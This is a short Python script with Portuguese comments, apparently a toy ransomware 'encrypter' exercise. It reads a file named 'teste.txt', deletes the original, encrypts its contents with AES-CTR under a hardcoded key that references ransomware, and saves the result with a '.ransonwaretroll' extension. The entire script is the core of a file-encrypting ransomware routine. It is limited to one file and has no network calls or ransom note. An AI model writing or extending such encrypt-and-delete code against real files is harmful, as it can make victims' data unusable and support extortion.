# Encrypter

# Importando bibliotecas
import os
import pyaes

# Abrindo o arquivo a ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Removendo o arquivo original
os.remove(file_name)

# Definindo a chave de encriptação
key = b'testeransonwares'
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografando o arquivo
crypto_data = aes.encrypt(file_data)

# Salvando o arquivo criptografado
new_file = file_name + '.ransonwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()